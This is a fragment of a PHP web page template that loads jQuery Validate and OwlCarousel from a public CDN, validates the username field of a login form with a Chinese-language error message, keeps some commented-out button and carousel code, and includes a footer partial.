<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
<script>

    jQuery.extend(jQuery.validator.messages, {
        required: "請檢查並填寫正確的內容"
    });
    $("#loginForm").validate({
        rules: {
            username: "required",
        }
    });
    // jQuery('#login-form input').on('input', function() {
    //     let check = true;
    //     jQuery('#login-form input').each(function() {
    //         if (jQuery(this).val() == '') check = false;
    //     });
    //     if (check) jQuery('.btn').removeClass('disabled');
    //     else jQuery('.btn').addClass('disabled')
    // });
/*
    $('.owl-carousel').owlCarousel({
        loop: true,
        margin: 0,
        nav: false,
        dots: false,
        autoplay: true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 1
            },
            1000: {
                items: 1
            }
        }
    })
*/
</script>

<?php
include('partials/footer-new.php');
?>

